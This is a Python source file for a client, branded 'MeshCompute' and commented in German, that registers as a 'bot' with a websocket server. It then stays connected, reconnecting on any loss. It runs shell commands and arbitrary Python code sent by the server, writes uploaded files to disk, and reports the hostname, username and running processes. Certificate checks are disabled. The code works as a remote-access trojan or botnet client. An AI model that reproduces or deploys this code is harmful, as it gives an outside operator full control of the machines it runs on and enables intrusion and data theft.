# client/main.py
import asyncio
import json
import uuid
import platform
import psutil
import logging
import shlex
import os
import sys
import socket
import base64
from pathlib import Path
import websockets

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

CONFIG_FILE = Path("bot_credentials.json")
MAX_COMMAND_TIMEOUT = int(os.getenv("MAX_COMMAND_TIMEOUT", "60"))

# ====================== KONFIGURATION LADEN ======================
def _load_build_config():
    """Liest die build_config.py und gibt ein dict mit SERVER_URL und REGISTRATION_TOKEN zurück."""
    try:
        if getattr(sys, 'frozen', False):
            base = sys._MEIPASS
        else:
            base = os.path.dirname(os.path.abspath(__file__))

        config_path = os.path.join(base, "build_config.py")
        if os.path.isfile(config_path):
            config_vars = {}
            with open(config_path, "r", encoding="utf-8") as f:
                exec(f.read(), config_vars)
            return config_vars
    except Exception:
        pass
    return None

build_cfg = _load_build_config()

# --- SERVER_URL ---
SERVER_URL = os.getenv("SERVER_URL")
if not SERVER_URL and build_cfg:
    SERVER_URL = build_cfg.get("SERVER_URL")
if not SERVER_URL:
    SERVER_URL = "ws://localhost:8080/ws"   # absoluter Fallback

# --- SSL-Kontext (wss) ---
if SERVER_URL.startswith("wss://"):
    import ssl
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
else:
    ssl_context = None

# --- REGISTRATION_TOKEN ---
REGISTRATION_TOKEN = os.getenv("REGISTRATION_TOKEN")
if not REGISTRATION_TOKEN and build_cfg:
    REGISTRATION_TOKEN = build_cfg.get("REGISTRATION_TOKEN")

# Kein hartkodierter Fallback – später klare Fehlermeldung, wenn nötig
if not REGISTRATION_TOKEN:
    REGISTRATION_TOKEN = None


def load_existing_config():
    """Lädt gespeicherte Bot-ID/Secret aus Datei oder Umgebung. Gibt dict oder None zurück."""
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE) as f:
                data = json.load(f)
            bot_id = data.get("bot_id")
            bot_secret = data.get("bot_secret")
            if bot_id and bot_secret:
                return {"bot_id": bot_id, "bot_secret": bot_secret}
        except Exception:
            pass
    # Fallback Umgebungsvariablen
    env_id = os.getenv("BOT_ID")
    env_secret = os.getenv("BOT_SECRET")
    if env_id and env_secret:
        return {"bot_id": env_id, "bot_secret": env_secret}
    return None


async def register_bot(bot_id, server_url, reg_token):
    """Registriert einen neuen Bot beim Server."""
    try:
        async with websockets.connect(server_url, ssl=ssl_context) as ws:
            await ws.send(json.dumps({
                "type": "register_bot",
                "bot_id": bot_id,
                "registration_token": reg_token,
            }))
            response = await asyncio.wait_for(ws.recv(), timeout=10)
            data = json.loads(response)
            if data.get("type") == "registration_ok":
                return data["bot_id"], data["bot_secret"]
    except Exception as e:
        logger.error(f"Registrierungsfehler: {e}")
    return None


async def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "python": platform.python_version(),
        "cpu_cores": psutil.cpu_count(logical=False),
        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "username": os.getenv("USER") or os.getenv("USERNAME", "unknown"),
        "cwd": os.getcwd(),
        "bot_id": BOT_ID,
        "pid": os.getpid()
    }


async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
    try:
        args = shlex.split(cmd)
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {
                "success": proc.returncode == 0,
                "output": stdout.decode('utf-8', errors='replace'),
                "error": stderr.decode('utf-8', errors='replace'),
                "returncode": proc.returncode
            }
        except asyncio.TimeoutError:
            proc.kill()
            return {"success": False, "error": "Command timed out"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def main():
    global BOT_ID, BOT_SECRET

    # 1. Vorhandene Konfiguration prüfen
    existing = load_existing_config()
    if existing:
        BOT_ID = existing["bot_id"]
        BOT_SECRET = existing["bot_secret"]
    else:
        # 2. Keine Konfiguration → Registrierung nötig
        if not REGISTRATION_TOKEN:
            print("❌ Bot konnte nicht gestartet werden. Kein REGISTRATION_TOKEN und keine lokale Konfiguration.")
            sys.exit(1)

        BOT_ID = f"{socket.gethostname()}-{str(uuid.uuid4())[:8]}"
        result = await register_bot(BOT_ID, SERVER_URL, REGISTRATION_TOKEN)
        if result:
            BOT_ID, BOT_SECRET = result
            with open(CONFIG_FILE, "w") as f:
                json.dump({"bot_id": BOT_ID, "bot_secret": BOT_SECRET}, f)
        else:
            print("❌ Registrierung fehlgeschlagen.")
            sys.exit(1)

    print(f"MeshCompute Client gestartet → {BOT_ID}")

    while True:
        try:
            async with websockets.connect(
                SERVER_URL,
                ssl=ssl_context,
                ping_interval=20,
                ping_timeout=40
            ) as ws:
                await ws.send(json.dumps({
                    "type": "client",
                    "bot_id": BOT_ID,
                    "bot_secret": BOT_SECRET
                }))
                logger.info(f"✅ Verbunden als {BOT_ID}")

                async for raw_msg in ws:
                    try:
                        msg = json.loads(raw_msg)
                        if msg.get("action") == "shell":
                            await ws.send(json.dumps({
                                "type": "shell_output",
                                "output": f"Shell gestartet auf {BOT_ID}\n",
                                "bot_id": BOT_ID,
                                "task_id": msg.get("task_id")
                            }))
                        elif msg.get("type") == "shell_input":
                            command = msg.get("command", "")
                            task_id = msg.get("task_id")
                            if command.lower() in ["exit", "quit"]:
                                await ws.send(json.dumps({
                                    "type": "shell_exit",
                                    "bot_id": BOT_ID,
                                    "task_id": task_id
                                }))
                                continue
                            result = await execute_command(command)
                            output = result.get("output", "")
                            if result.get("error"):
                                output += "\n" + result["error"]
                            await ws.send(json.dumps({
                                "type": "shell_output",
                                "output": output,
                                "bot_id": BOT_ID,
                                "task_id": task_id
                            }))
                        elif msg.get("type") == "file_upload":
                            filename = msg.get("filename")
                            content_b64 = msg.get("content")
                            task_id = msg.get("task_id")
                            try:
                                data = base64.b64decode(content_b64)
                                upload_dir = Path("uploads")
                                upload_dir.mkdir(exist_ok=True)
                                safe_filename = Path(filename).name
                                file_path = upload_dir / safe_filename
                                with open(file_path, "wb") as f:
                                    f.write(data)
                                await ws.send(json.dumps({
                                    "type": "file_upload_done",
                                    "bot_id": BOT_ID,
                                    "task_id": task_id,
                                    "filename": safe_filename,
                                    "path": str(file_path),
                                    "size": len(data)
                                }))
                                logger.info(f"Datei gespeichert: {file_path}")
                            except Exception as e:
                                logger.error(f"Upload-Fehler: {e}")
                                await ws.send(json.dumps({
                                    "type": "file_upload_done",
                                    "bot_id": BOT_ID,
                                    "task_id": task_id,
                                    "error": str(e)
                                }))
                        elif "action" in msg:
                            action = msg["action"]
                            task_id = msg.get("task_id")
                            payload = msg.get("payload")
                            result = {
                                "type": "result",
                                "task_id": task_id,
                                "bot_id": BOT_ID,
                                "action": action
                            }
                            try:
                                if action == "exec":
                                    res = await execute_command(payload)
                                    result.update(res)
                                elif action == "sysinfo":
                                    result["success"] = True
                                    result["info"] = await get_system_info()
                                elif action == "python":
                                    exec_globals = {}
                                    exec(payload, exec_globals)
                                    result.update({
                                        "success": True,
                                        "output": str(exec_globals.get("output", "Code executed"))
                                    })
                                elif action == "ps":
                                    processes = [{"pid": p.info['pid'], "name": p.info['name']} for p in psutil.process_iter(['pid', 'name'])][:30]
                                    result.update({"success": True, "processes": processes})
                                elif action == "ping":
                                    result.update({"success": True, "message": "pong"})
                                else:
                                    result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})
                            except Exception as e:
                                result.update({"success": False, "error": str(e)})
                            await ws.send(json.dumps(result))
                    except json.JSONDecodeError:
                        continue
                    except Exception as e:
                        logger.warning(f"Nachrichtenverarbeitungsfehler: {e}")
        except websockets.exceptions.ConnectionClosed:
            logger.warning("Verbindung zum Server verloren → Reconnect...")
            await asyncio.sleep(3)
        except Exception as e:
            logger.error(f"Verbindungsfehler: {e}")
            await asyncio.sleep(3)

if __name__ == "__main__":
    asyncio.run(main())